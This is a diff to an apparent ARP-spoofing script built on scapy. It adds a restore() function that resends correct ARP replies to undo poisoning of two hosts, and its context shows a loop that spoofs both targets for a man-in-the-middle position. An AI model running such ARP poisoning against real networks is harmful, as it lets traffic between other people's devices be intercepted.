@@ -33,6 +33,26 @@ def lineno():
     return inspect.currentframe().f_back.f_lineno
 
 
+def restore():
+    """This function restores the ARP table on both devices by useing the data
+    in ip_mac and sending two ARP response packets. Basically, just reversing
+    what we did to manipulate it to start with."""
+    ip_mac_list = list(ip_mac.items())
+
+    packet = scapy.ARP(op=2)
+    packet.psrc = ip_mac_list[0][0]
+    packet.hwsrc = ip_mac_list[0][1]
+    packet.pdst = ip_mac_list[1][0]
+    packet.hwdst = ip_mac_list[1][1]
+    scapy.send(packet, verbose=False)
+
+    packet.psrc = ip_mac_list[1][0]
+    packet.hwsrc = ip_mac_list[1][1]
+    packet.pdst = ip_mac_list[0][0]
+    packet.hwdst = ip_mac_list[0][1]
+    scapy.send(packet, verbose=False)
+
+
 def get_mac(ip):
     """This function gets the mac address of 'ip' and stores it in the
     dictionary. We only do this once."""
@@ -74,7 +94,8 @@ def main():
             spoofer(target_ip=target_x, spoofed_ip=target_z)
             spoofer(target_ip=target_z, spoofed_ip=target_x)
     except KeyboardInterrupt:
-        pass
+       restore()
+       print(colored("\n\nAll is as it was...", 'green'))
 
 
 if __name__ == "__main__":
